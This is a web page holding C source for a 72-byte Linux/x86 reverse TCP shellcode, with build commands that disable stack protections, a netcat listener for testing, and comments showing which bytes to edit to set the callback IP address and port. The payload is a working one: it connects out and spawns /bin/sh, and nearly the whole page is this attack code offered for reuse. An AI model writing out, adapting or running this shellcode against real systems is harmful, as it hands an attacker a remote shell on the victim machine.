<html><head><title>Linux/x86 - Shell Reverse TCP Shellcode - 72 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

 Shell Reverse TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shell_reverse_tcp_shellcode

 * 72 bytes
 * null-bytes free if the port and address are
 * the ip address and port number are easily changeable (2nd to 5th bytes are the IP) and (9th and 10th are the Port)
 

 # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
 # ./shellcode

 Testing
 # nc -l 127.1.1.1 55555
 # ./shellcode 

*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = \

&quot;\x68&quot;
&quot;\x7f\x01\x01\x01&quot;  // &lt;- IP Number &quot;127.1.1.1&quot;
&quot;\x5e\x66\x68&quot;
&quot;\xd9\x03&quot;          // &lt;- Port Number &quot;55555&quot;
&quot;\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02&quot;
&quot;\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79&quot;
&quot;\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a&quot;
&quot;\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f&quot;
&quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;
&quot;\xeb\xce&quot;;

main ()
{

        // When the IP contains null-bytes, printf will show a wrong shellcode length.

	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ (&quot;movl $0xffffffff, %eax\n\t&quot;
		 &quot;movl %eax, %ebx\n\t&quot;
		 &quot;movl %eax, %ecx\n\t&quot;
		 &quot;movl %eax, %edx\n\t&quot;
		 &quot;movl %eax, %esi\n\t&quot;
		 &quot;movl %eax, %edi\n\t&quot;
		 &quot;movl %eax, %ebp&quot;);

	int (*ret)() = (int(*)())code;

	ret();

}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
